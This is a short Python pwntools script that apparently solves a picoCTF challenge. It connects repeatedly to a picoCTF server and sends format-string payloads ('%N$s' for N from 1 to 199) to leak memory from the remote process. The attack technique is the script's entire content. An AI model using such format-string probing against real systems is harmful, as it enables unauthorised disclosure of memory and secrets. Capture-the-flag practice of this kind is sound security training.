from pwn import *



for i in range(1,200):
    io = remote("saturn.picoctf.net",62893)
    print(f'{i}')
    io.sendlineafter(">>",f'%{i}$s')
    try:
        result = io.recvall().decode()
    except UnicodeDecodeError:
        print('-')
        result = ''
    print(result)


